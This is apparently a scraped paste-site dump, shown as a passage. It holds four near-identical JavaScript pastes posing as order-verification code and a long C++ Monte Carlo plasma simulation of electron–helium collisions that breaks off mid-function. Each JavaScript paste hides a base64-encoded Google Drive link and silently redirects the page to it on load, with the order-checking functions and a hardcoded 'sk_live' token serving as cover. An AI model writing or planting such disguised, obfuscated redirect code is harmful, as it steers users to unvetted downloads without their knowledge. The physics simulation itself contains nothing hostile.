    ""Unknown"": 658,
    ""hosting & proxy"": 7371,
    ""proxy"": 18,
    ""hosting"": 54
  }
}"
LXiVTXkz,Order.js,jm33,JavaScript,Wednesday 16th of April 2025 07:03:01 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/87882/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
yfHCQkCW,Market.js,jm33,JavaScript,Wednesday 16th of April 2025 06:47:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/39964/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WKFTNsfc,Untitled,jm33,JavaScript,Wednesday 16th of April 2025 06:32:15 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/66667/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kyrK8ePa,Products.js,jm33,JavaScript,Wednesday 16th of April 2025 06:16:52 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/03864/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
9SwicrpP,superelastic+field_heating(anomaluos heating not solved),phystota,C++,Wednesday 16th of April 2025 06:04:52 PM CDT,"#include <iostream>
#include <random>
#include <fstream>
#include <assert.h>

#include <math.h>
#include <time.h>
#include <iomanip>  // For std::fixed and std::setprecision

#include <algorithm>  // For std::shuffle
#include <numeric>    // For std::iota

//physical constants

#define m_e 9.1093837E-31 // electron mass in kg
#define M_n 6.6464731E-27 // Helium atom mass
#define k_b 1.380649E-23 // Boltzmann constant
#define q 1.602176634E-19 // elementary charge    - eV -> J transfer param
#define Coulomb_log 15.87 // Coulomb logarithm
#define epsilon_0 8.854188E-12 // Vacuum permittivity
#define Coulomb_const pow(q,4)/(pow(4.0*M_PI*epsilon_0,2)) // e^4/(4*pi*eps0)^2
#define thresh1 19.82 // threshold energy excitation tripet state
#define thresh2 20.61 // threshold energy excitation singlet state

// simulation parameters

#define n_e 50000
// #define N_He 1000000 // Helium neutrals number
#define T_n 2.0 // Helium neutral temperature in eV
#define T_e 5.0    // electron Maxwell initial distribution
#define Emin 0.0
#define Emax 4000.0
#define Volume 1.0E-12 // Volume to calculate netral density and collision frequency 
#define time 3.0E-2 // 500 microsec time to equalibrate the system
#define dopant 1.0E-5 // addition to avoid zero
#define E_reduced 0.01 // constant electrin field along z-axis

#define bin_width 0.05 // keep energy step ~ this to maintain cross-section clarity (Ramsauer minimum etc)
#define N ( (int)((Emax-Emin)/bin_width) + 1) // add 1 to include E_max if needed?

// handling final energy bin

#define bin_width_smooth 0.05 // energy bin for smooth final distribution
#define N_smooth ( (int)((Emax-Emin)/bin_width_smooth) )



double solve_A(double s) { // Netwon method solver

    if (s > 3) {
        return 3*exp(-s);
    }
    if (s < 0.01) {
        return 1.0/s;
    }
    
    double A0 = 0.01; // initial guess
    double A = A0;  //starting with initial guess
    double tol = 1.0E-7; // accuracy

             
    for (int i = 0; i < 1000; i++){

        double tanhA = tanh(A);
        // Avoid division by an extremely small tanh(A)
        if (fabs(tanhA) < 1e-12) {
            std::cerr << ""tanh(A) too small, returning fallback at iteration "" << i << ""\n"";
            return 1.0E-7;
        }        

        double f = 1.0 / tanhA - 1.0 / A - exp(-s);
        if (fabs(f) < tol)
            break;

        double sinhA = sinh(A);
        if (fabs(sinhA) < 1e-12) {
            std::cerr << ""sinh(A) too small, returning fallback at iteration "" << i << ""\n"";
            return 1.0E-5;
        }

        double dfdA = -1.0/(sinh(A)*sinh(A)) + 1.0/(A*A);

        // Check if derivative is too close to zero to avoid huge updates
        if (fabs(dfdA) < 1e-12) {
            std::cerr << ""dfdA is too small at iteration "" << i << "", returning fallback\n"";
            if (s < 0.01) {
//                std::cout << ""Small s! Huge A!"" << ""\n"";
                return 1.0/s;
            }
            if (s > 3) {
                return 3.0*exp(-s);
            }
        }        

        A -= f/dfdA;

        // Early check for numerical issues
        if (std::isnan(A) || std::isinf(A)) {
            std::cerr << ""Numerical error detected, invalid A at iteration "" << i << ""\n"";
            return (A > 0) ? 1.0E-5 : -1.0E-5;  // Fallback value based on sign
        }        


    }

    return A;
}

struct Electron {

    //velocity components
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;
    //energy in eV
    double energy = 0.0;
    //Collision flag
    bool collided_en = false;
    bool collided_ee = false;

    // initializing Maxwell-Boltzmann distribution with T_e
    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/m_e);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }


};

struct CrossSection {
    double energy;
    double sigma;
};

double interpolate (double energy, const std::vector<CrossSection>& CS) {


    if (energy < CS.front().energy) {
//        std::cout << "" required energy value lower than range of cross-section data at energy: "" << energy << ""\n"";
        return 0.0;
    }
    if (energy > CS.back().energy) {
//        std::cout << "" required energy value higher than range of cross-section data"" << ""\n"";
        return 0.0;        
    }

    int step = 0;   
        while (step < CS.size() && energy > CS[step].energy) {
            step++;
        }

    double k = (CS[step].sigma - CS[step-1].sigma)/(CS[step].energy - CS[step-1].energy);
    double m = CS[step].sigma - k*CS[step].energy;
    
    return k*energy + m; 
}


struct NeutralParticle {

    double energy = 0.0;
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;

    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/M_n);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }
    
};

struct Excited_neutral {

    double energy;
    double vx;
    double vy;
    double vz;
    
};



int main() {

    clock_t start = clock();

    int N_He = 1000000;

    std::vector<Electron> electrons(n_e); // better to use vector instead of simple array as it's dynamically allocated (beneficial for ionization)
//    std::vector<NeutralParticle> neutrals(N_He); // I don't need a vector of neutrals bcs it's like a backhround in MCC-simulation

    std::vector<int> histo_random(N, 0); // initialize N size zero-vector for random (initial) histogram
    std::vector<int> histo_maxwell(N, 0); // initialize N size zero-vector for maxwellian histogram
    std::vector<int> histo_neutral(N, 0); // initialize N size zero-vector for neutral distribution histogram
    std::vector<int> histo_excited(N, 0); // initialize N size zero-vector for excited He distribution histogram

    std::vector<double> elastic_vec(N, 0); // precompiled elastic cross-section-energy vector
    std::vector<double> inelastic1_vec(N, 0); // precompiled inelastic(triplet excitation) cross-section-energy vector
    std::vector<double> inelastic2_vec(N, 0); // precompiled inelastic(singlet excitation) cross-section-energy vector    
    std::vector<double> superelastic1_vec(N, 0); // precompiled superelastic(triplet de-excitation) cross-section-energy vector
    std::vector<double> superelastic2_vec(N, 0); // precompiled superelastic(triplet de-excitation) cross-section-energy vector

    std::random_device rd; 
    std::mt19937 gen(rd());
    std::uniform_real_distribution<double> dis(0.0, 1.0);
    std::gamma_distribution<double> maxwell_neutral(1.5, T_n);
    std::gamma_distribution<double> maxwell_electron(1.5, T_e);

    std::ifstream elastic_cs_dat(""cross_sections/elastic.dat"");
    if (!elastic_cs_dat.is_open()) {
        std::cerr << ""Error opening elastic cross-sections file!"" << std::endl;
        return 1;
    }    

    std::ifstream excitation1_cs_dat(""cross_sections/inelastic_triplet.dat"");
    if (!excitation1_cs_dat.is_open()) {
        std::cerr << ""Error opening inelastic triplet cross-sections file!"" << std::endl;
        return 1;
    }

    std::ifstream excitation2_cs_dat(""cross_sections/inelastic_singlet.dat"");
    if (!excitation2_cs_dat.is_open()) {
        std::cerr << ""Error opening inelastic singlet cross-sections file!"" << std::endl;
        return 1;
    }

    // --- starts reading cross section datafiles

//-----------------elastic---------------------------//
    std::vector<CrossSection> elastic_CS_temp;

    double energy, sigma;

    while (elastic_cs_dat >> energy >> sigma) {
        elastic_CS_temp.push_back({energy, sigma});
    }    
    elastic_cs_dat.close();

    energy = 0.0;
    sigma = 0.0;
//-----------------triplet excitation---------------------------//
    std::vector<CrossSection> inelastic1_CS_temp;

    while (excitation1_cs_dat >> energy >> sigma) {
        inelastic1_CS_temp.push_back({energy, sigma});
    }    
    excitation1_cs_dat.close();    
//-----------------singlet excitation---------------------------//
    energy = 0.0;
    sigma = 0.0;

    std::vector<CrossSection> inelastic2_CS_temp;

    while (excitation2_cs_dat >> energy >> sigma) {
        inelastic2_CS_temp.push_back({energy, sigma});
    }    
    excitation2_cs_dat.close();    

    // --- finish reading cross-section datafiles  

    std::ofstream file0(""output_files/velocities.dat"");    
    std::ofstream file1(""output_files/energies.dat"");        
    std::ofstream file2(""output_files/energies_final.dat"");    
    std::ofstream file3(""output_files/histo_random.dat"");    
    file3 << std::fixed << std::setprecision(10);
    
    std::ofstream file4(""output_files/histo_maxwell.dat"");
    file4 << std::fixed << std::setprecision(10);           
    
    std::ofstream file5(""output_files/neutral_distribution.dat"");    
    std::ofstream file6(""output_files/E*f(E).dat"");    
    std::ofstream file7(""output_files/nu_max.dat"");
    std::ofstream file8(""output_files/electron_mean_energy.dat"");
    std::ofstream file9(""output_files/nu_elastic_average_initial.dat"");
    std::ofstream file10(""output_files/nu_inelastic1_average_initial.dat"");
    std::ofstream file11(""output_files/nu_elastic_average_final.dat"");
    std::ofstream file12(""output_files/nu_inelastic1_average_final.dat""); 
    std::ofstream file13(""output_files/log_output.dat"");  
    std::ofstream file14(""output_files/excited_energies.dat"");       
    std::ofstream file15(""output_files/excited_histo.dat"");             
    std::ofstream file_temp(""output_files/collision_rates.dat"");  

    // Initialize all electrons
    for (auto& e : electrons) {
        e.initialize(gen, dis, maxwell_electron);
    }

    // precalculate cross-sections for each energy bin
    for (int i = 0; i < N; i++){
        elastic_vec[i] = interpolate(bin_width*(i+0.5), elastic_CS_temp); //elastiuc
        inelastic1_vec[i] = interpolate(bin_width*(i+0.5), inelastic1_CS_temp); //triplet excitation
        inelastic2_vec[i] = interpolate(bin_width*(i+0.5), inelastic2_CS_temp); //singlet excitation
    }

    // precalculate superelastic cross-section (triplet -> ground) for each energy bin
    // detailed balance gives: sigma_j_i(E) = (g_i/g_j)*((E+theshold)/E)*sigma_i_j(E+theshold)
    for (int i = 0; i < N; i++){
        double energy = Emin + (i + 0.5) * bin_width;
        int thresh_bin = (int)( (thresh1 - Emin)/bin_width ); // calculating bin for threshold energy
        superelastic1_vec[i] = (1.0/3.0)*((energy + thresh1)/energy)*interpolate(energy + thresh1, inelastic1_CS_temp); // using detailed balance, calculating backward deexcitation cross-section
        superelastic2_vec[i] = (1.0/1.0)*((energy + thresh2)/energy)*interpolate(energy + thresh2, inelastic2_CS_temp);
    }

    for (int i = 0; i < n_e; i++){
        file1 << i << "" "" << electrons.at(i).energy << ""\n"";
        file0 << i << "" "" << electrons[i].vx << "" "" << electrons[i].vy << "" "" << electrons[i].vz << ""\n""; 
    }

    // -----initial electrons energy distribution starts------------////
    for (int i = 0; i < n_e; i++){
        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_random.size())
            histo_random[bin]++;
    }

    for (int i = 0; i < histo_random.size(); i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file3 << bin_center << "" "" <<  static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n""; // this is electron normalized distribution function
    }
    // -----initial electrons energy distribution ends------------////    

    // // -----neutrals Maxwell-Boltzmann distribution starts------------////
    // for (int i = 0; i < N_He; i++){
    //     int bin = (int)( (neutrals[i].energy - Emin)/bin_width );
    //     if (bin >=0 && bin < histo_neutral.size())
    //         histo_neutral[bin]++;
    // }    

    // for (int i = 0; i < histo_neutral.size(); i++){
    //     double bin_center = Emin + (i + 0.5) * bin_width;
    //     file5 << bin_center << "" "" << static_cast<double>(histo_neutral[i])/(neutrals.size()*bin_width) << ""\n""; // this is real f(E) - normalized distribution
    //     file6 << bin_center << "" "" << bin_center*static_cast<double>(histo_neutral[i])/(neutrals.size()*bin_width) << ""\n""; // this should be E*f(E) 

    // }

    // // -----neutrals Maxwell-Boltzmann distribution starts------------////       


    //calculating excited specied population

    /*From Boltzman distribution y_k = g_k*exp(-E_k/kT)/norm, where g_k - stat weight of k-state, 
    E_k - threshold energy for k-state, norm is a total partition function or normaliztion factor     */

    double part_ground = 1.0*exp(-0.0/T_n); // partition function for ground state
    double part_triplet = 3.0*exp(-thresh1/T_n); // partition function for triplet excited state
    double part_singlet = 1.0*exp(-thresh2/T_n); // partition function for singlet excited state
    double part_func_total = part_ground + part_triplet + part_singlet; // total partition function
    double N_trpilet = (part_triplet/part_func_total)*N_He; // population of tripet state 
    double N_singlet = (part_singlet/part_func_total)*N_He; // population of singlet state

    std::vector<Excited_neutral> exc_1(static_cast<int>(N_trpilet));  // vector to track triplet excited atoms of Helium
    std::vector<Excited_neutral> exc_2(static_cast<int>(N_singlet));  // vector to track singlet excited atoms of Helium    

    // adjusting neutrals number:

    N_He -= (N_trpilet + N_singlet);

    std::cout << N_He << ""\n"";

    // initializing excited species with Maxwellian distribution

    for (auto& exc : exc_1) {
    NeutralParticle tmp_neutral;
    tmp_neutral.initialize(gen, dis, maxwell_neutral);
    exc.energy = tmp_neutral.energy;
    exc.vx = tmp_neutral.vx;
    exc.vy = tmp_neutral.vy;
    exc.vz = tmp_neutral.vz;
    }

    for (auto& exc : exc_2) {
    NeutralParticle tmp_neutral;
    tmp_neutral.initialize(gen, dis, maxwell_neutral);
    exc.energy = tmp_neutral.energy;
    exc.vx = tmp_neutral.vx;
    exc.vy = tmp_neutral.vy;
    exc.vz = tmp_neutral.vz;
    }

    std::cout << ""Triplet population initialized: "" << exc_1.size() << ""\n"";
    std::cout << ""Singlet population initialized: "" << exc_2.size() << ""\n"";    

    // calculating excited specied population finished //

    // -----calculating nu-max for null-collision method starts ------------////
    double nu_max = 0.0;
    double nu_max_temp = 0.0;
    double sigma_total = 0.0;
    
    for (int i = 0; i < N; i++){
        sigma_total = elastic_vec[i] + inelastic1_vec[i] + superelastic1_vec[i] + inelastic2_vec[i] +  superelastic2_vec[i];
//        sigma_total = elastic_vec[i] + inelastic1_vec[i] + inelastic2_vec[i]; // ??? densities of excited states are much lower!!!
        nu_max_temp = (N_He/Volume)*sigma_total * sqrt(2.0*(i*bin_width + bin_width/2.0)*q/m_e);
        file7 << i << "" "" << nu_max_temp << ""\n"";
        if (nu_max_temp > nu_max)
            nu_max = nu_max_temp;
    }

    std::cout << nu_max << ""\n"";
    // -----calculating nu-max for null-collision method ends ------------////

    //----- calculating number to calculate nu-average (both elastic/inelastic )from our electron distribution starts---------///
    // --- calculating nu(E)*f(E) for later external integration, using initial f(E)
    for (int i = 0; i < N; i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file9 << bin_center << "" "" << (N_He/Volume)*elastic_vec[i] * sqrt(2.0*bin_center*q/m_e)*static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n"";
        file10 << bin_center << "" "" << (N_He/Volume)*inelastic1_vec[i] * sqrt(2.0*bin_center*q/m_e)*static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n"";
    }
    //----- calculating nu-average from our electron distribution ends ---------///    

    double dt = 0.05/nu_max;   // minimum should be 0.1/nu_max to get acceptable numerical error range see Vahedi Surrendra 1995
    double steps = static_cast<int>(time/dt);

    std::cout << steps << ""\n"";
    std::cout << dt << ""\n"";

    //using  null-collision technique, getting the number of particles colliding each step: P_collision = 1 - exp(-nu_max*dt)
    int Ne_collided = (1.0-exp(-1.0*dt*nu_max))*n_e;


    int print_interval = 100;
    int el_coll_counter = 0; // track all elastic collisions
    int exc1_coll_counter = 0; // track all triplet excitation collisions
    int exc2_coll_counter = 0; // track all singlet excitation collisions
    int null_coll_counter = 0; // track null-collisions
    int ee_coll_counter = 0; //track e-e Coulomb collisions
    int super1_coll_counter = 0; // track superelastic triplet collisions
    int super2_coll_counter = 0; // track superelastic triplet collisions    


    for (int t = 0; t < steps; t++){

//        file_temp << t << "" "" << exc_1.size() << "" "" << exc_2.size() << ""\n"";       
        
//        std::cout << N_He + exc_1.size() + exc_2.size() << ""\n"";        

        // Generate shuffled list of electron indices
        int reshuffle_interval = 1;
        std::vector<int> electron_indices(n_e);
        std::iota(electron_indices.begin(), electron_indices.end(), 0); // fill with index
        std::shuffle(electron_indices.begin(), electron_indices.end(), gen); // shuffle the indexes    

        // Generate shuffled list of triplet excited atoms indices
        std::vector<int> excited1_indices(exc_1.size());
        std::iota(excited1_indices.begin(), excited1_indices.end(), 0); // fill with index
        std::shuffle(excited1_indices.begin(), excited1_indices.end(), gen); // shuffle the indexes    

        // Generate shuffled list of singlet excited atoms indices
        std::vector<int> excited2_indices(exc_2.size());
        std::iota(excited2_indices.begin(), excited2_indices.end(), 0); // fill with index
        std::shuffle(excited2_indices.begin(), excited2_indices.end(), gen); // shuffle the indexes    

        int exc1_coll_counter_temp = 0;
        int super1_coll_counter_temp = 0;
        int exc2_coll_counter_temp = 0;
        int super2_coll_counter_temp = 0;
        int null_coll_counter_temp = 0;

        std::cout << ""timestep remains: "" << steps - t << ""\n"";

 

        // calculating mean energy 
        double total_energy = 0.0;
        for (const auto& e : electrons) total_energy += e.energy;
        double mean_energy = total_energy / n_e;
        file8 << t*dt << "" "" << mean_energy << ""\n"";            


        // setting flags to false each timestep
        for (auto& e : electrons) e.collided_en = false;
        for (auto& e : electrons) e.collided_ee = false;        

        int collision_counter_en = 0; // electron-neutral collision counter
        int collision_counter_ee = 0; // e-e collisoin counter


        for (int idx : electron_indices) {

            if (collision_counter_en >= Ne_collided) break; // quit if reached all collisions

            Electron& e = electrons[idx];
            if (e.collided_en) continue;  // Skip already collided electrons

            double electron_energy = e.energy;
            int bin_energy = static_cast<int>(electron_energy / bin_width);
            double nu_elastic = (N_He/Volume) * elastic_vec[bin_energy] * sqrt(2.0*electron_energy*q/m_e);
            double nu_inelastic1 = (N_He/Volume) * inelastic1_vec[bin_energy] * sqrt(2.0*electron_energy*q/m_e);
            double nu_superelastic1 = (exc_1.size()/Volume) * superelastic1_vec[bin_energy] * sqrt(2.0*electron_energy*q/m_e);
            double nu_inelastic2 = (N_He/Volume) * inelastic2_vec[bin_energy] * sqrt(2.0*electron_energy*q/m_e);
            double nu_superelastic2 = (exc_2.size()/Volume) * superelastic2_vec[bin_energy] * sqrt(2.0*electron_energy*q/m_e);

            double r = dis(gen);

            double P0 = nu_elastic/nu_max;
            double P1 = (nu_elastic + nu_inelastic1)/nu_max;
            double P2 = (nu_elastic + nu_inelastic1 + nu_superelastic1)/nu_max;
            double P3 = (nu_elastic + nu_inelastic1 + nu_superelastic1 + nu_inelastic2)/nu_max;
            double P4 = (nu_elastic + nu_inelastic1 + nu_superelastic1 + nu_inelastic2 + nu_superelastic2)/nu_max;            

            if (r < P0) {

                // elastic collision happens
 
                // ----   Collision energy redistribution module
 
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;
                
                // neutral that collides with electron
 
                // randomize particles each collision
 
                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V_x_n = tmp_neutral.vx;
                double V_y_n = tmp_neutral.vy;
                double V_z_n = tmp_neutral.vz;
                double E_n = tmp_neutral.energy;
 
 
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                if (cos_khi >= 1)
                    cos_khi = 1.0 - dopant;
                if (cos_khi <= -1)
                    cos_khi = -1.0 + dopant;
                                     
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities  
 
                double delta_E = 2.0*(m_e/M_n)*(1.0 - cos_khi)*E_0;
                if (e.energy < delta_E) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;
                }     
                else {                           
                    e.energy = E_0 - delta_E;
                }
                
 
                double speed = sqrt(2*e.energy*q/m_e);
 
                e.vx = speed*i_scat;
                e.vy = speed*j_scat;
                e.vz = speed*k_scat;              
 
                collision_counter_en++;
                el_coll_counter++;
 
                e.collided_en = true;
            }        

            else if (r < P1) {

                //inelastic 1(triplet) collision happens

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;
                
                // neutral that collides with electron

                // randomize particles each collision

                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V_x_n = tmp_neutral.vx;
                double V_y_n = tmp_neutral.vy;
                double V_z_n = tmp_neutral.vz;
                double E_n = tmp_neutral.energy;

 
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                if (e.energy < thresh1) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;
                }
                else {
                    e.energy = E_0 - thresh1;
 
                    double speed = sqrt(2*e.energy*q/m_e);
 
                    e.vx = speed*i_scat;
                    e.vy = speed*j_scat;
                    e.vz = speed*k_scat;
 
                    collision_counter_en++;   
                    exc1_coll_counter++;
                    exc1_coll_counter_temp++;
 
                    e.collided_en = true;

                    // pushing this neutral to an array of excited species exc_1
                    if (N_He > 0) {
                        exc_1.push_back({E_n, V_x_n, V_y_n, V_z_n});
                        N_He--;
                    }
                }
            }     

            else if (r < P2) {

                //superelastic 1(triplet -> ground state) collision happens

                if (exc_1.empty()) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;            
                }

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;

                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);

                // neutral that collides with electron
                // taking particles from dynamic array of excited neutrals

                int index = std::uniform_int_distribution<int>(0, exc_1.size()-1)(gen);
                Excited_neutral& exc = exc_1[index];
                double V_x = exc.vx;
                double V_y = exc.vy;
                double V_z = exc.vz;
                double E = exc.energy;
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
